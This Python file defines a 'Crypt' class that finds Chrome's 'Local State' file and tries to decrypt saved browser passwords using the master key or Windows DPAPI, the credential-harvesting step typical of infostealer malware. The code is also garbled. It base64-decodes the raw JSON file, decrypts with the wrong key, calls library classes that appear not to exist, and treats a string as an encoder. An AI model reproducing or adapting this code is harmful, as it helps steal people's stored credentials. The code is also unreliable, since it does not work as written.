import base64
import binascii
import json
import os
import re
import sodium

class Crypt:
    def __init__(self):
        pass

    @staticmethod
    def decrypt_chrome(password, browser=''):
        # Check if Chromium version is greater than 80
        if re.search(r'v10', password) or re.search(r'v11', password):
            # Get master key location
            master_key_path = None
            for l_s in ['', '..', '..\\']:
                master_key_path = os.path.join(browser, l_s, 'Local State')
                if os.path.exists(master_key_path):
                    break

            # Get master key
            master_key = None
            if master_key_path:
                with open(master_key_path, 'r') as f:
                    master_key = f.read()

            # Decrypt master key
            if master_key:
                # Convert base64 string to bytes
                master_key_bytes = base64.b64decode(master_key, validate=True)
                # Parse JSON and get encrypted key
                json_data = json.loads(master_key_bytes.decode('utf-8'))
                encrypted_key = json_data['os_crypt']['encrypted_key']

                # Decrypt encrypted key using AES-GCM
                iv = password[3:15]
                payload = password[15:]
                try:
                    decrypted_key = sodium.SecretAeadAes.decrypt(payload, iv, master_key_bytes)
                    return decrypted_key.decode('utf-8')
                except Exception as e:
                    return f"failed ({e})"
            else:
                return "failed (no master key)"
        else:
            # Decrypt using DPAPI
            try:
                return sodium.DPAPI.decrypt(password.encode('utf-8'), None, None).decode('utf-8')
            except Exception as e:
                return f"failed ({e})"

    @staticmethod
    def to_utf8(text):
        # Convert Windows-1251 to UTF-8
        encoding = 'Windows-1251'
        bytes_text = encoding.get_bytes(text)
        utf8_text = encoding.convert(bytes_text)
